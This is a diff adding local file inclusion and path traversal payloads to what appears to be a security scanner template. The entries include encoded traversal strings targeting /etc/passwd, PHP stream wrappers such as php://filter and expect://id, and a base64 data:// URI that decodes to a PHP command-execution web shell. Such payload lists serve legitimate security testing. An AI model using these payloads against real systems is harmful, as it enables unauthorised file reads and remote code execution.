@@ -40,6 +40,81 @@
         "value": "file:///etc/passwd",
         "encoding": "none",
         "method": "GET"
+      },
+      {
+        "value": "....\\\\....\\\\....\\\\etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "..%2f..%2f..%2fetc%2fpasswd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "..%252f..%252f..%252fetc%252fpasswd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "php://filter/convert.base64-encode/resource=index.php",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "php://filter/read=string.rot13/resource=index.php",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "php://input",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "expect://id",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "zip://archive.zip%23shell.php",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "phar://path/to/archive.phar/shell.php",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/etc/passwd%00",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/etc/passwd%00.jpg",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "../../../../../../../etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "....//....//....//....//....//....//....//etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/var/www/../../etc/passwd",
+        "encoding": "none",
+        "method": "GET"
       }
     ],
     "matchers": [
